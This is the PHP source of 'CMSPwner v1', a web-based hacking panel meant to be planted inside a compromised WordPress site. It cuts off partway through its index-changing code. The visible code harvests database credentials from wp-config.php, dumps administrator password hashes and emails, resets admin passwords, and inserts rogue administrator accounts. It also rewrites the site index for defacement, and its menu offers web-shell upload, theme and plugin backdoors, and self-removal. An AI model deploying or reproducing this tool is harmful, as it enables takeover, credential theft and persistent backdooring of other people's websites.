<?php
#########
#########
session_start();
$authUser = 'Xt3mP';
$authPass = '63a9f0ea7bb98050796b649e85481845';
function checkTable($dbName, $dbPref)
{
	$query = mysql_query('SHOW TABLES FROM '.$dbName) or die(mysql_error());
	$allowedTables = array($dbPref.'options', $dbPref.'users', $dbPref.'usersmeta');
	$counter = 0;
	while($table = mysql_fetch_array($query))
	{
		if(in_array($table[0], $allowedTables))
			$counter++;
	}
	if($counter != 2)
		return false;
	else
		return true;
}
function getInfo($pref, $optionName)
{
	$data = mysql_fetch_object(mysql_query('SELECT option_value FROM '.$pref.'options WHERE 

option_name="'.$optionName.'"'));
	return $data->option_value;
}
function getVersion($url)
{
	$source = file_get_contents($url);
	$data = preg_match("/<meta name=\"generator\" content=\"WordPress (.*)\" \/>/", $source, 

$version);
	return $version[1];
}
function getTotalAdmins($pref)
{
	$adms = @mysql_num_rows(@mysql_query('SELECT user_id FROM '.$pref.'usermeta WHERE 

meta_value=10'));
	return $adms;
}
function getAdmins($pref, $type = 'name')
{
	$adm = @mysql_query('SELECT user_id FROM '.$pref.'usermeta WHERE meta_value=10');
	while($admId = @mysql_fetch_object($adm))
	{
		if($type == 'name')
		{
			$admData = @mysql_fetch_object(@mysql_query('SELECT user_login, user_nicename 

FROM '.$pref.'users WHERE ID='.$admId->user_id));
			$option .= '<option value="'.$admId->user_id.'">'.$admData->user_login.'['.

$admData->user_nicename.']</option>';
		}
		else
		{
			$class = ($number == '0') ? 'dark-green' : 'light-green';
			$admData = @mysql_fetch_object(@mysql_query('SELECT user_login, user_pass, 

user_email FROM '.$pref.'users WHERE ID='.$admId->user_id));
			$option .= '<tr class="'.$class.'"><td>'.$admData->user_login.'</td><td>'.

$admData->user_pass.'</td><td>'.$admData->user_email.'</td></tr>';
			$number = ($number == '0') ? '1' : '0';
		}
	}
	if($type == 'name')
		return $option;
	else
		return '<table width="100%" align="center"><tr 

class="header"><td>User</td><td>Pass</td><td>Mail</td></tr>'.$option.'</table>';
}
function updateAdmin($pref, $admUser, $admPass)
{
	$newPass = md5($admPass);
	$update = @mysql_query('UPDATE '.$pref.'users SET user_pass="'.$newPass.'" WHERE ID='.$admUser);
	if(!$update)
		return false;
	else
		return true;
}
function getAdminById($pref, $admId)
{
	$admData = @mysql_fetch_object(@mysql_query('SELECT user_login FROM '.$pref.'users WHERE ID='.

$admId));
	return $admData->user_login;
}
function checkUser($pref, $admUser)
{
	$adm = @mysql_num_rows(@mysql_query('SELECT user_login FROM '.$pref.'users WHERE user_login="'.

$admUser.'"'));
	if($adm > 0)
		return false;
	else
		return true;
}
function addAdminUser($pref, $admUser, $admPass)
{
	$insert = @mysql_query('INSERT INTO '.$pref.'users (user_login, user_pass, user_nicename, 

user_email) values ("'.$admUser.'", "'.md5($admPass).'", "'.$admUser.'", "'.$admUser.'@'.

$admUser.'.com")');
	if(!$insert)
	{
		return false;
	}
	else
		$id = @mysql_fetch_object(@mysql_query('SELECT ID FROM '.$pref.'users WHERE 

user_login="'.$admUser.'"'));
		$insert = mysql_query('INSERT INTO '.$pref.'usermeta (user_id, meta_key, meta_value) 

values ('.$id->ID.', "wp_capabilities", "a:1:{s:13:\"administrator\";s:1:\"1\";}")') or die(mysql_error

());
		$insert = mysql_query('INSERT INTO '.$pref.'usermeta (user_id, meta_key, meta_value) 

values ('.$id->ID.', "wp_user_level", "10")') or die(mysql_error());
		return true;
}
function checkLogin($wpUrl, $wpUser, $wpPass)
{
	$fields = 'log='.$wpUser.'&pwd='.$wpPass.'&wp-submit=Acceder';
	$ch = curl_init();  
 	curl_setopt($ch, CURLOPT_USERAGENT, 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:9.0a2) 

Gecko/20111014 Firefox/9.0a2');
	curl_setopt($ch, CURLOPT_AUTOREFERER, false);
	curl_setopt($ch, CURLOPT_REFERER, $wpUrl);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_URL, $wpUrl.'/wp-login.php'); 
	curl_setopt($ch, CURLOPT_POST, true);  
	curl_setopt($ch, CURLOPT_POSTFIELDS, $fields); 
	curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
	$data = curl_exec($ch);
	curl_close($ch);
	if(strstr($data, '<strong>ERROR</strong>'))
		return false;
	else
		return true;
}
function sourceIndex($wpUrl, $theme)
{
	$ch = curl_init();  
	curl_setopt($ch, CURLOPT_URL, $wpUrl.'/wp-admin/theme-editor.php?file=index.php&theme='.$theme); 
	curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
 	curl_setopt($ch, CURLOPT_USERAGENT, 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:9.0a2) 

Gecko/20111014 Firefox/9.0a2');
	curl_setopt($ch, CURLOPT_AUTOREFERER, false);
	curl_setopt($ch, CURLOPT_REFERER, $wpUrl.'/wp-admin/theme-editor.php?file=index.php&theme='.

$theme);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	$data = curl_exec($ch);
	curl_close($ch);
	return $data;
}
function changeIndex($wpUrl, $wpCont, $theme, $wpnonce)
{
	$ch = curl_init();  
	$fields = '_wpnonce='.$wpnonce.'&newcontent='.urlencode

($wpCont).'&action=update&file=index.php&theme='.$theme.'&scrollto=0&submit=Actualizar Archivo';
	curl_setopt($ch, CURLOPT_URL, $wpUrl.'/wp-admin/theme-editor.php?file=index.php&theme='.$theme); 
	curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
 	curl_setopt($ch, CURLOPT_USERAGENT, 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:9.0a2) 

Gecko/20111014 Firefox/9.0a2');
	curl_setopt($ch, CURLOPT_AUTOREFERER, false);
	curl_setopt($ch, CURLOPT_REFERER, $wpUrl.'/wp-admin/theme-editor.php?file=index.php&theme='.

$theme);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_POST, true);  
	curl_setopt($ch, CURLOPT_POSTFIELDS, $fields); 
	$data = curl_exec($ch);
	curl_close($ch);
	return true;
}
function getThemes()
{
	$themes = scandir('./wp-content/themes/');
	foreach($themes as $theme)
	{
		if($theme != '.' && $theme != '..' && is_dir('./wp-content/themes/'.$theme))
		{
			$realThemes .= '<option value="'.$theme.'">'.$theme.'</option>';
		}
	}
	return $realThemes;
}
function getPlugins()
{
	$plugins = scandir('./wp-content/plugins/');
	foreach($plugins as $plugin)
	{
		if($plugin != '.' && $plugin != '..' && is_dir('./wp-content/plugins/'.$plugin))
		{
			$pluginData = pathinfo('./wp-content/plugins/'.$plugin);
			$pluginPath = $plugin;
			if(!is_dir('./wp-content/plugins/'.$plugin))
			{
				$pluginPath = '/';
				$plugin = $pluginData['filename'];
			}
			$realPlugins .= '<option value="'.$pluginPath.'">'.$plugin.'</option>';
		}
	}
	return $realPlugins.'<option value="/">/</option>';
}

function getInstalledPlugins($wpUrl, $plugins, $home = false)
{
	$data = preg_match("/a:(.*):{/", $plugins, $a);
	for($i = 0; $i < $a[1]; $i++)
	{
		$c = $a[1] - 1;
		if($i != $c)
		{
			$next = $i + 1;
			$pat = "/i:$i;s:[0-9]*:\"(.*)\";i:$next/";
		}else{
			if($a[1] == 1)
				$pat = "/{i:$i;s:[0-9]*:\"(.*)\";}/";
			else
				$pat = "/;i:$i;s:[0-9]*:\"(.*)\";/";
		}
		$datas = preg_match($pat, $plugins, $b);
		$pluginsc .= (!$home) ? '<a href="'.$wpUrl.'/wp-content/plugins/'.$b[1].'" 

target="_blank">'.$b[1].'</a><br />' : '<option value="'.$b[1].'">'.$b[1].'</option>';
	}
	return (!$home) ? substr($pluginsc, 0, strlen($pluginsc) - 6) : $pluginsc;
}
?>
<!DOCTYPE html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>CMSPwner v1 [WP Version]</title>
<style 

type="text/css">html,body,div,span,applet,object,iframe,h1,h2,h3,h4,h5,h6,p,blockquote,pre,a,abbr,acrony

m,address,big,cite,code,del,dfn,em,img,ins,kbd,q,s,samp,small,strike,strong,sub,sup,tt,var,b,u,i,center,

dl,dt,dd,ol,ul,li,fieldset,form,label,legend,table,caption,tbody,tfoot,thead,tr,th,td,article,aside,canv

as,details,embed,figure,figcaption,footer,header,hgroup,menu,nav,output,ruby,section,summary,time,mark,a

udio,video{border:0;font:inherit;font-size:100%;margin:0;padding:0;vertical-align:baseline}

article,aside,details,figcaption,figure,footer,header,hgroup,menu,nav,section{display:block}body{line-

height:1}ol,ul{list-style:none}blockquote,q{quotes:none}

blockquote:before,blockquote:after,q:before,q:after{content:none}table{border-collapse:collapse;border-

spacing:0}</style>
<style type="text/css">body{background-color:#2b2b2b;color:#828282;font-family:"Courier New", Courier, 

monospace;font-size:13px;font-weight:700;line-height:1em}div#container{width:600px}div#container 

fieldset{background-color:#FBFBFB;border:1px dashed #000;padding:5px;text-align:justify}hr{background-

color:#000;color:#000}div#container legend{background-color:#FFF;border:1px dashed 

#000;color:#000;padding:5px}fieldset#login .a{width:200px}div#container input,div#container 

select,div#container textarea{-moz-border-radius:3px;-webkit-border-radius:3px;background-

color:#333;border:1px dashed #000;border-radius:3px;color:#FFF;font-family:"Courier New", Courier, 

monospace;font-weight:700;padding:5px;text-align:center;width:148px}div#container textarea

{resize:none;width:83%}div#container input:hover,div#container input:focus{font-style:normal}

div#container input[type=submit]:hover{background-color:#888;cursor:pointer;text-shadow:1px 1px 1px 

#999}div#container .error,div#container .success{background-color:#ff4040;border:1px dashed 

red;color:#FFF;float:left;margin-bottom:5px;padding:5px;width:100%!important}div#container .success

{background-color:#49A349;border:1px dashed #002E00}div#container .menu{border-bottom:1px dashed 

#000;float:left;font-size:14px;margin-bottom:5px;padding-bottom:5px;text-align:center;width:100%}.data

{float:left;width:98%}.menu ul li{float:left;height:10px;width:100px}.menu ul li ul{background-

color:#FBFBFB;border:1px dashed #000;border-top:none;display:none;float:left;height:auto;margin-

top:2px;position:relative;width:130px}.menu ul li:hover ul{display:block}.menu ul li ul li

{background:#CCC;float:left;height:10px;padding:5px 0 5px 2px;text-align:left;width:130px}.menu ul 

li.nonse{float:left;width:20px}div#sql_data,div#data{border-top:1px dashed #000;margin-top:5px;padding-

top:5px}div#sql_data label,div#data label{float:left;margin-right:5px;padding:8px 0;text-

align:right;width:60px}div#container .clear{float:left;width:100%}div#sql_data input[type=text],div#data 

input[type=text],div#data select,div#data textarea{margin-right:5px}select{text-align:center}

div#container a{color:#111;text-decoration:none}div#container a:hover{color:#191919;text-

decoration:underline}div#data{border:none}div#info{border-bottom:1px dashed #000;padding-bottom:5px}

table,td,tr{padding:5px;text-align:center}.header{background-color:#000;color:#FFF}.light-green,.dark-

green{background-color:#FCFCFC;color:#000}div#container input[type=submit],.dark-green{background-

color:#666}div#sql_data input[type=submit],div#data input[type=submit],div#data select{width:160px}

div#container .get_config{border-top:1px dashed #000;margin-top:5px;padding-top:5px;text-align:center}

div#container .success a,div#container .success a:hover,.dark-green{color:#FFF}</style>
<script src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
<script>$(function(){windowsHeight=$(window).height();windowsWidth=$(window).width();div=

$('#container');divHeight=div.height();divWidth=div.width();up=windowsHeight/2.3-

(divHeight/2);left=windowsWidth/2-(divWidth/2);$("#container").css("margin-top",up);$("#container").css

("margin-left",left);function putValue(fieldId,newValue,defaultValue){if($("#"+fieldId).val()

==defaultValue){$("#"+fieldId).val(newValue)}}$("#user").focusin(function(){putValue

("user","","User")});$("#user").focusout(function(){putValue("user","User","")});$("#pass").focusin

(function(){putValue("pass","","********")});$("#pass").focusout(function(){putValue

("pass","********","")});$("#db_srvr").focusin(function(){putValue("db_srvr","","localhost")});

$("#db_srvr").focusout(function(){putValue("db_srvr","localhost","")});$("#db_user").focusin(function()

{putValue("db_user","","root")});$("#db_user").focusout(function(){putValue("db_user","root","")});

$("#db_pass").focusin(function(){putValue("db_pass","","root")});$("#db_pass").focusout(function()

{putValue("db_pass","root","")});$("#db_name").focusin(function(){putValue("db_name","","wp_db")});

$("#db_name").focusout(function(){putValue("db_name","wp_db","")});$("#db_pref").focusin(function()

{putValue("db_pref","","wp_")});$("#db_pref").focusout(function(){putValue("db_pref","wp_","")});

$("#new_pass").focusin(function(){putValue("new_pass","","new_pass")});$("#new_pass").focusout(function

(){putValue("new_pass","new_pass","")});$("#new_user").focusin(function(){putValue

("new_user","","Admin2")});$("#new_user").focusout(function(){putValue("new_user","Admin2","")});

$("#wp_url").focusin(function(){putValue("wp_url","","http://site.com/wp")});$("#wp_url").focusout

(function(){putValue("wp_url","http://site.com/wp","")});$("#shell_name").focusin(function(){putValue

("shell_name","","shell.php")});$("#shell_name").focusout(function(){putValue

("shell_name","shell.php","")})});</script>
</head>
<body>
<div id="container">
	<div class="logo">
		<pre>
       _____ __  __  _____ _____                                  __ 
    X / ____|  \/  |/ ____|  __ \                                /_ |X
    t| |    | \  / | (___ | |__) |_      ___ __   ___ _ __  __   _| |t
    3| |    | |\/| |\___ \|  ___/\ \ /\ / / '_ \ / _ \ '__| \ \ / / |3
    m| |____| |  | |____) | |     \ V  V /| | | |  __/ |     \ V /| |m
    P \_____|_|  |_|_____/|_|      \_/\_/ |_| |_|\___|_| t00l \_/ |_|P                                   

                               
		</pre>
	</div>
	<form action="" method="POST" enctype="multipart/form-data">
		<?php
		if(!$_SESSION['logged']):
		?>
			<fieldset id="login">
				<legend>CMSPwner v1 - Login</legend>
				<?php
				$showLogin = true;
				if(isset($_POST['login'])):
					$user = $_POST['user'];
					$pass = $_POST['pass'];
					if($user != $authUser or md5($pass) != $authPass):
						echo '<div class="error">Bad username or 

password</div>';
					else:
						$showLogin = false;
						$_SESSION['logged'] = true;
						$_SESSION['user'] = $user;
						echo '<div class="success">Welcome '.$user.'</div>';
						echo '<META HTTP-EQUIV="refresh" CONTENT="2; url=?">';
					endif;
				endif;
				if($showLogin):
				?>
					<input type="text" id="user" name="user" value="User" 

class="a"/>
					<input type="password" id="pass" name="pass" value="********" 

class="a"/>
					<input type="submit" name="login" value="Access" />
				<?php
				endif;
				?>
			</fieldset>
		<?php
		else:
		?>
			<fieldset>
				<?php
				if(!$_SESSION['sqlCredentials']):
				?>
					<legend>CMSPwner v1 - SQL Credentials</legend>
					This system requires SQL credentials to work correctly. Please 

make sure that your credentials are correct.<br />
					<?php
					$showForm = true;
					if($_GET['s3ct10n'] == 'getconfig'):
						if(isset($_POST['get_config'])):
							$configContent = @file_get_contents('./wp-

config.php');
							if(!$configContent):
								echo '<div class="error">Can\'t 

open/found wp-config.php file</div>';
							else:
								$data = @preg_match("/define\('DB_HOST', 

'(.*)'\);/", $configContent, $host);
								$data = @preg_match("/define\('DB_USER', 

'(.*)'\);/", $configContent, $user);
								$data = @preg_match("/define

\('DB_PASSWORD', '(.*)'\);/", $configContent, $pass);
								$data = @preg_match("/define\('DB_NAME', 

'(.*)'\);/", $configContent, $name);
								$data = @preg_match("/table_prefix  = 

'(.*)';/", $configContent, $pref);
								$_SESSION['dbSrvr'] = $host[1];
								$_SESSION['dbUser'] = $user[1];
								$_SESSION['dbPass'] = $pass[1];
								$_SESSION['dbName'] = $name[1];
								$_SESSION['dbPref'] = $pref[1];
								$showForm = false;
								echo '<div class="success">Configuration 

obtained correctly</div>';
								echo '<META HTTP-EQUIV="refresh" 

CONTENT="2; url=?">';
							endif;
						endif;
						if($showForm):
							$file = basename($_SERVER['PHP_SELF']);
					?>
							<div class="get_config" style="text-

align:left;">You need put this file in same WP path:</div>
							<div id="sql_data">
								<div 

class="clear"><label>File:</label><input type="text" value="<?php echo $file; ?>" disabled="disabled" 

/>< Script<br /></div>
								<div class="clear"><label></label><input 

type="submit" name="get_config" value="Get Config" /></div>
							</div>
					<?php
						endif;
					else:
						if(isset($_POST['sql'])):
							$dbSrvr = $_POST['db_srvr'];
							$dbUser = $_POST['db_user'];
							$dbPass = $_POST['db_pass'];
							$dbName = $_POST['db_name'];
							$dbPref = $_POST['db_pref'];
							$dbCon = @mysql_connect($dbSrvr, $dbUser, 

$dbPass);
							$dbSel = @mysql_select_db($dbName, $dbCon);
							if(!$dbCon):
								echo '<div class="error">Can\'t connect 

to the server: '.$dbUser.'@'.$dbSrvr.'</div>';
							elseif(!$dbSel):
								echo '<div class="error">Can\'t select 

DB: '.$dbName.'</div>';
							elseif(!checkTable($dbName, $dbPref)):
								echo '<div class="error">Can\'t detect 

WP tables with Preffix: '.$dbPref.'</div>';
							else:
								$_SESSION['dbSrvr'] = $dbSrvr;
								$_SESSION['dbUser'] = $dbUser;
								$_SESSION['dbPass'] = $dbPass;
								$_SESSION['dbName'] = $dbName;
								$_SESSION['dbPref'] = $dbPref;
								$_SESSION['sqlCredentials'] = true;
								$showForm = false;
								echo '<div class="success">SQL 

Credentials accepted correctly</div>';
								echo '<META HTTP-EQUIV="refresh" 

CONTENT="2; url=?">';
							endif;
						endif;
						if($showForm):
							$srvr = (empty($_SESSION['dbSrvr'])) ? 

'localhost' : $_SESSION['dbSrvr'];
							$user = (empty($_SESSION['dbUser'])) ? 'root' : 

$_SESSION['dbUser'];
							$pass = (empty($_SESSION['dbPass'])) ? 'root' : 

$_SESSION['dbPass'];
							$name = (empty($_SESSION['dbName'])) ? 'wp_db' : 

$_SESSION['dbName'];
							$pref = (empty($_SESSION['dbPref'])) ? 'wp_': 

$_SESSION['dbPref'];
					?>
							<div class="get_config">[<a href="?

s3ct10n=getconfig">Try to get config automatically</a>]</div>
							<div id="sql_data">
								<div 

class="clear"><label>Server:</label><input type="text" id="db_srvr" name="db_srvr" value="<?php echo 

$srvr; ?>" />< Insert SQL Server<br /></div>
								<div 

class="clear"><label>User:</label><input type="text" id="db_user" name="db_user" value="<?php echo 

$user; ?>" />< Insert SQL Username<br /></div>
								<div 

class="clear"><label>Pass:</label><input type="text" id="db_pass" name="db_pass" value="<?php echo 

$pass; ?>" />< Insert SQL Password<br /></div>
								<div 

class="clear"><label>Name:</label><input type="text" id="db_name" name="db_name" value="<?php echo 

$name; ?>" />< Insert SQL Database Name<br /></div>
								<div 

class="clear"><label>Prefix:</label><input type="text" id="db_pref" name="db_pref" value="<?php echo 

$pref; ?>" />< Insert Wordpress DB Preffix<br /></div>
								<div class="clear"><label></label><input 

type="submit" name="sql" value="Check SQL Data" />
							</div>
					<?php
						endif;
					endif;
					?>
				<?php
				else:
					$dbCon = @mysql_connect($_SESSION['dbSrvr'], $_SESSION

['dbUser'], $_SESSION['dbPass']);
					@mysql_select_db($_SESSION['dbName'], $dbCon);
				?>
					<legend>CMSPwner v1 - System</legend>
					<div class="menu">
						<ul>
							<li>Menu
								<ul>
									<li><a href="?">Home</a></li>
									<li><a href="?

s3ct10n=logout">Logout</a></li>
									<li><a href="?

s3ct10n=selfremove">Self Remove</a></li>
									<li><a href="?

s3ct10n=about">About</a></li>
								</ul>
							</li>
							<li>Admin
								<ul>
									<li><a href="?s3ct10n=1">Adm 

List</a></li>
									<li><a href="?s3ct10n=2">Reset 

Adm Pass</a></li>
									<li><a href="?s3ct10n=3">Add New 

Adm</a></li>
								</ul>
							</li>
							<li>Change Index
								<ul>
									<li><a href="?s3ct10n=4">Main 

[fopen]</a></li>
									<li><a href="?s3ct10n=5">Theme 

[cURL]</a></li>
									<li><a href="?s3ct10n=6">Theme 

[fopen]</a></li>
								</ul>
							</li>
							<li>Shell
								<ul>
									<li><a href="?

s3ct10n=7">Upload</a></li>
									<li><a href="?s3ct10n=8">Make 

[themes]</a></li>
									<li><a href="?s3ct10n=9">Make 

[plugins]</a></li>
								</ul>
							</li>
							<li>Backdoor
								<ul>
									<li><a href="?s3ct10n=10">Active 

Theme</a></li>
									<li><a href="?s3ct10n=11">Active 

Plugin</a></li>
								</ul>
						</ul>
					</div>
					<div class="data">
						<?php
						$s3ct10n = $_GET['s3ct10n'];
						switch($s3ct10n):
							case '':
						?>
								WP Version: <?php echo getVersion

(getInfo($_SESSION['dbPref'], 'siteurl')); ?><br />
								WP Url: <a href="#"><?php echo getInfo

($_SESSION['dbPref'], 'siteurl'); ?></a><br />
								WP Mail: <?php echo getInfo($_SESSION

['dbPref'], 'admin_email'); ?><br />
								WP Theme: <a target="_blank" href="<?php 

echo getInfo($_SESSION['dbPref'], 'siteurl'); ?>/wp-content/themes/<?php echo getInfo($_SESSION

['dbPref'], 'template'); ?>"><?php echo getInfo($_SESSION['dbPref'], 'template'); ?></a><br />
								WP Active Plugins: <br /><?php echo 

getInstalledPlugins(getInfo($_SESSION['dbPref'], 'siteurl'), getInfo($_SESSION['dbPref'], 

'active_plugins')); ?><br />
								WP Adm Users: <?php echo getTotalAdmins

($_SESSION['dbPref']); ?><br />
								WP Blog Charset: <?php echo getInfo

($_SESSION['dbPref'], 'blog_charset'); ?><br />
								WP DB Host: <?php echo $_SESSION

['dbSrvr']; ?><br />
								WP DB User: <?php echo $_SESSION

['dbUser']; ?><br />
								WP DB Pass: <?php echo $_SESSION

['dbPass']; ?><br />
								WP DB Server: <?php echo $_SESSION

['dbName']; ?><br />
								WP DB Preffix: <?php echo $_SESSION

['dbPref']; ?>
							<?php
							break;
							case 'logout':
								$showForm = true;
								if(isset($_POST['no'])):
									echo '<META HTTP-EQUIV="refresh" 

CONTENT="0; url=?">';
								elseif(isset($_POST['yes'])):
									@session_destroy();
									echo '<META HTTP-EQUIV="refresh" 

CONTENT="0; url=?">';
								endif;
								if($showForm):
							?>
									<div id="info">Logout?</div>
									<div id="data">
										<div class="clear" 

style="text-align: center;"><input type="submit" value="No" name="no" /> - <input type="submit" 

value="Yes" name="yes" /></div>
									</div>
							<?php
								endif;
							break;
							case 'selfremove':
								$showForm = true;
								if(isset($_POST['no'])):
									echo '<META HTTP-EQUIV="refresh" 

CONTENT="0; url=?">';
								elseif(isset($_POST['yes'])):
									@session_destroy();
									@unlink(basename($_SERVER

['PHP_SELF']));
									echo '<META HTTP-EQUIV="refresh" 

CONTENT="0; url=?">';
								endif;
								if($showForm):
							?>
									<div id="info">Self remove?

</div>
									<div id="data">
										<div class="clear" 

style="text-align: center;"><input type="submit" value="No" name="no" /> - <input type="submit" 

value="Yes" name="yes" /></div>
									</div>
							<?php
								endif;
							break;
							case 'about':
							?>
								<div id="info">About</div>
								<div id="data">
								<pre style="text-align: center;">
                          
                          .--,-``-.                    ,-.----.    
 ,--,     ,--,   ___     /   /     '.            ____  \    /  \   
 |'. \   / .`| ,--.'|_  / ../        ;         ,'  , `.|   :    \  
 ; \ `\ /' / ; |  | :,' \ ``\  .`-    '     ,-+-,.' _ ||   |  .\ : 
 `. \  /  / .' :  : ' :  \___\/   \   :  ,-+-. ;   , ||.   :  |: | 
  \  \/  / ./.;__,'  /        \   :   | ,--.'|'   |  |||   |   \ : 
   \  \.'  / |  |   |         /  /   / |   |  ,', |  |,|   : .   / 
    \  ;  ;  :__,'| :         \  \   \ |   | /  | |--' ;   | |`-'  
   / \  \  \   '  : |__   ___ /   :   ||   : |  | ,    |   | ;     
  ;  /\  \  \  |  | '.'| /   /\   /   :|   : |  |/     :   ' |     
./__;  \  ;  \ ;  :    ;/ ,,/  ',-    .|   | |`-'      :   : :     
|   : / \  \  ;|  ,   / \ ''\        ; |   ;/          |   | :     
;   |/   \  ' | ---`-'   \   \     .'  '---'           `---'.|     
`---'     `--`            `--`-,,-'                      `---`    
</pre>
<pre>
+------------------------------------------------------------------------+
|                       Website: http://xt3mp.mx                         |
|                     Contact: xt3mp[at]null[dot]net                     |
+------------------------------------------------------------------------+
</pre>
								</div>
							<?php
							break;
							case 1:
							?>
								<div id="info">All Admin users appear 

below:</div>
								<div id="data"><?php echo getAdmins

($_SESSION['dbPref'], 'list'); ?></div>
							<?php
							break;
							case 2:
								$showForm = true;
								if(isset($_POST['change_pass'])):
									$admUser = $_POST['adminId'];
									$admPass = $_POST['admin_pass'];
									if(!updateAdmin($_SESSION

['dbPref'], $admUser, $admPass)):
										echo '<div 

class="error">Can\'t update admin password: Internal error</div>';
									else:
										$admUser = getAdminById

($_SESSION['dbPref'], $admUser);
										$showForm = false;
										echo '<div 

class="success">Admin password updated correctly: '.$admUser.'::'.$admPass.'</div>';
										echo '<META HTTP-

EQUIV="refresh" CONTENT="2; url=?">';
									endif;
								endif;
							?>
								<?php
								if($showForm):
								?>
									<div id="info">Select Admin User 

and Insert a New Password:</div>
									<div id="data">
										<div 

class="clear"><label>User:</label><select name="adminId"><?php echo getAdmins($_SESSION['dbPref']); ?

></select>< Select Admin User<br /></div>
										<div 

class="clear"><label>Pass:</label><input type="text" id="new_pass" name="admin_pass" value="new_pass" 

/>< Insert New Password<br /></div>
										<div 

class="clear"><label></label><input type="submit" name="change_pass" value="Change Admin Pass" /></div>
									</div>
								<?php
								endif;
								?>
							<?php
							break;
							case 3:
								$showForm = true;
								if(isset($_POST['add_admin'])):
									$admUser = $_POST['admin_user'];
									$admPass = $_POST['admin_pass'];
									if(!checkUser($_SESSION

['dbPref'], $admUser)):
										echo '<div 

class="error">Can\'t add new Admin User: '.$admUser.' is in use</div>';
									elseif(!addAdminUser($_SESSION

['dbPref'], $admUser, $admPass)):
										echo '<div 

class="error">Can\'t insert new Admin User: Internal error</div>';
									else:
										$showForm = false;
										echo '<div 

class="success">New Admin User inserted correctly: '.$admUser.'::'.$admPass.'</div>';
										echo '<META HTTP-

EQUIV="refresh" CONTENT="2; url=?">';
									endif;
								endif;
							?>
								<?php
								if($showForm):
								?>
									<div id="info">Insert New Admin 

User:</div>
									<div id="data">
										<div 

class="clear"><label>User:</label><input type="text" id="new_user" name="admin_user" value="Admin2" />< 

Insert Admin User<br /></div>
										<div 

class="clear"><label>Pass:</label><input type="text" id="new_pass" name="admin_pass" value="new_pass" 

/>< Insert New Password<br /></div>
										<div 

class="clear"><label></label><input type="submit" name="add_admin" value="Add New Admin" /></div>
									</div>
								<?php
								endif;
								?>
							<?php
							break;
							case 4:
								$showForm = true;
								$indexContent = @file_get_contents

('./index.php');
								if(isset($_POST['change_index'])):
									$newContent = stripslashes

($_POST['new_content']);
									$newIndex = @fopen('index.php', 

'w+');
									if(!$newIndex):
										echo '<div 

class="error">Can\'t create new index file</div>';
									else:
										$showForm = false;
										@fwrite($newIndex, 

$newContent);
										@fclose($newIndex);
										echo '<div 

class="success">Index updated correctly</div>';
										echo '<META HTTP-

EQUIV="refresh" CONTENT="2; url=?">';
									endif;
								endif;
								if($showForm):
								?>
									<div id="info">Insert New Index 

Content (WP Main Index) [fopen]:</div>
									<div id="data">
										<div 

class="clear"><label>Content:</label><textarea name="new_content" style="text-align: left;font-

size:13px;font-family:'Courier New', Courier, monospace" rows="5"><?php echo $indexContent; ?

></textarea><br /></div>
										<div 

class="clear"><label></label><input type="submit" name="change_index" value="Change Index" /></div>
									</div>
								<?php
								endif;
							?>
							<?php
							break;
							case 5:
								$showForm = true;
								$next = false;
								if(isset($_POST['change_index'])):
									$wpUrl = getInfo($_SESSION

['dbPref'], 'siteurl');
									if(substr($wpUrl, -1) == '/')
										$wpUrl = substr($wpUrl, 

0, strlen($wpUrl) - 1);
									$wpUser = $_POST['admin_user'];
									$wpPass = $_POST['admin_pass'];
									$wpCont = stripslashes($_POST

['new_content']);
									if(!checkLogin($wpUrl, $wpUser, 

$wpPass)):
										echo '<div 

class="error">Can\'t login with: '.$wpUser.'::'.$wpPass.'</div>';
									else:
										$source = sourceIndex

($wpUrl, getInfo($_SESSION['dbPref'], 'template'));
										$data = @preg_match

("/<input type=\"hidden\" id=\"_wpnonce\" name=\"_wpnonce\" value=\"(.*)\" \/></", $source, $wpnonce);
										$next = true;
									endif;
									if($next === false):
									elseif($next === true && empty

($wpnonce[1])):
										echo '<div 

class="error">Can\'t get wp nonce</div>';
									elseif(!changeIndex($wpUrl, 

$wpCont, getInfo($_SESSION['dbPref'], 'template'), $wpnonce[1])):
										echo '<div 

class="error">Can\'t update index file</div>';
									else:
										$showForm = false;
										echo '<div 

class="success">Index updated correctly</div>';
										echo '<META HTTP-

EQUIV="refresh" CONTENT="2; url=?">';
									endif;
								endif;
								if($showForm):
							?>
									<div id="info" style="margin-

bottom: 5px;">Actual Theme: <a target="_blank" href="<?php echo getInfo($_SESSION['dbPref'], 'siteurl'); 

?>/wp-content/themes/<?php echo getInfo($_SESSION['dbPref'], 'template'); ?>"><?php echo getInfo

($_SESSION['dbPref'], 'template'); ?></a><br /></div>
									<div id="info">Insert New Index 

Content (WP Actual Theme Index) [cURL]:</div>
									<div id="data">
										<div 

class="clear"><label>User:</label><input type="text" id="new_user" name="admin_user" value="Admin2" />< 

Insert Admin User<br /></div>
										<div 

class="clear"><label>Pass:</label><input type="text" id="new_pass" name="admin_pass" value="new_pass" 

/>< Insert Admin Password<br /></div>
										<div 

class="clear"><label>Content:</label><textarea name="new_content" style="text-align: left;font-

size:13px;font-family:'Courier New', Courier, monospace" rows="5"></textarea><br /></div>
										<div 

class="clear"><label></label><input type="submit" name="change_index" value="Change Index" /></div>
									</div>
								<?php
								endif;
								?>
							<?php
							break;
							case 6:
								$showForm = true;
								$theme = getInfo($_SESSION['dbPref'], 

'template');
								if(isset($_POST['change_index'])):
									$wpCont = stripslashes($_POST

